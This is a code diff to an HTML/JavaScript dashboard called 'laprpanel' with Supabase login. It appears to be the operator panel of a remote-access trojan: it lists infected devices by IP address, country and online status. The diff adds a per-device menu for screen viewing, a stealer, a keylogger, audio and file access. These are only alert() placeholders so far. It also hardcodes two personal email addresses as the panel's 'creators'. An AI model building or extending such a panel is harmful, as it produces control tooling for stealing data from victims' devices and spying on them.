@@ -4,8 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>laprpanel</title>
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2">
-    </script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
     <style>
         * {
@@ -339,6 +338,46 @@
         }
         .status-online { background: #00ff9d; }
         .status-offline { background: #555; }
+
+        .device-actions {
+            position: relative;
+            cursor: pointer;
+            color: #aaa;
+        }
+        .device-actions:hover {
+            color: #00ff9d;
+        }
+
+        /* Контекстное меню действий */
+        .action-menu {
+            position: absolute;
+            right: 0;
+            top: 100%;
+            background: #1a1a2e;
+            border: 1px solid #2a2a3a;
+            border-radius: 10px;
+            padding: 8px 0;
+            z-index: 10;
+            min-width: 160px;
+            display: none;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.6);
+        }
+        .action-menu.show {
+            display: block;
+        }
+        .action-menu div {
+            padding: 10px 16px;
+            cursor: pointer;
+            font-size: 14px;
+            color: #ccc;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .action-menu div:hover {
+            background: #00ff9d10;
+            color: #00ff9d;
+        }
     </style>
 </head>
 <body>
@@ -430,7 +469,9 @@
     async function showDashboard() {
         currentView = 'dashboard';
         const { data: { user } } = await supabaseClient.auth.getUser();
-        isCreator = (user?.email === 'kilersosiska130@gmail.com');
+        // Список создателей
+        const creatorEmails = ['kilersosiska130@gmail.com', 'mamkoebar@gmail.com'];
+        isCreator = creatorEmails.includes(user?.email);
 
         document.getElementById('root').innerHTML = `
         <div class="dashboard">
@@ -488,6 +529,16 @@
                 <td>${d.ip}</td>
                 <td>${d.country}</td>
                 <td><span class="status-dot ${d.status==='online'?'status-online':'status-offline'}"></span>${d.status==='online'?'Online':'Offline'}</td>
+                <td class="device-actions" onclick="toggleActionMenu(event, '${d.id}')">
+                    <i class="fas fa-ellipsis-v"></i>
+                    <div id="menu-${d.id}" class="action-menu">
+                        <div onclick="alert('Просмотр экрана для ${d.name}')"><i class="fas fa-desktop"></i> Экран</div>
+                        <div onclick="alert('Стилер для ${d.name}')"><i class="fas fa-file-download"></i> Стилер</div>
+                        <div onclick="alert('Звук для ${d.name}')"><i class="fas fa-volume-up"></i> Звук</div>
+                        <div onclick="alert('Кейлоггер для ${d.name}')"><i class="fas fa-keyboard"></i> Кейлоггер</div>
+                        <div onclick="alert('Файловый менеджер ${d.name}')"><i class="fas fa-folder-open"></i> Файлы</div>
+                    </div>
+                </td>
             </tr>
         `).join('');
 
@@ -497,7 +548,7 @@
         <div class="card-content">
           <table class="device-table">
             <thead>
-              <tr><th>ID</th><th>Имя</th><th>ОС</th><th>IP</th><th>Страна</th><th>Статус</th></tr>
+              <tr><th>ID</th><th>Имя</th><th>ОС</th><th>IP</th><th>Страна</th><th>Статус</th><th></th></tr>
             </thead>
             <tbody>
               ${rows}
@@ -505,6 +556,25 @@
           </table>
         </div>`;
     }
+
+    // Функция для переключения меню действий
+    window.toggleActionMenu = function(event, deviceId) {
+        event.stopPropagation();
+        const menu = document.getElementById(`menu-${deviceId}`);
+        if (!menu) return;
+        // Закрыть все другие меню
+        document.querySelectorAll('.action-menu').forEach(m => {
+            if (m !== menu) m.classList.remove('show');
+        });
+        menu.classList.toggle('show');
+    };
+
+    // Закрытие меню при клике вне
+    document.addEventListener('click', function(event) {
+        if (!event.target.closest('.device-actions')) {
+            document.querySelectorAll('.action-menu').forEach(m => m.classList.remove('show'));
+        }
+    });
 
     function showPanel() { updateActiveNav('panel'); document.getElementById('content').innerHTML = getPanelContent(); }
 
@@ -580,7 +650,8 @@
         const { data: { session } } = await supabaseClient.auth.getSession();
         if (session) {
             const { data: { user } } = await supabaseClient.auth.getUser();
-            isCreator = (user?.email === 'kilersosiska130@gmail.com');
+            const creatorEmails = ['kilersosiska130@gmail.com', 'mamkoebar@gmail.com'];
+            isCreator = creatorEmails.includes(user?.email);
             showDashboard();
         } else {
             showAuthForm('login');
@@ -595,7 +666,8 @@
             showAuthForm('login');
         } else if (event === 'SIGNED_IN' && session) {
             supabaseClient.auth.getUser().then(({ data: { user } }) => {
-                isCreator = (user?.email === 'kilersosiska130@gmail.com');
+                const creatorEmails = ['kilersosiska130@gmail.com', 'mamkoebar@gmail.com'];
+                isCreator = creatorEmails.includes(user?.email);
                 showDashboard();
             });
         }
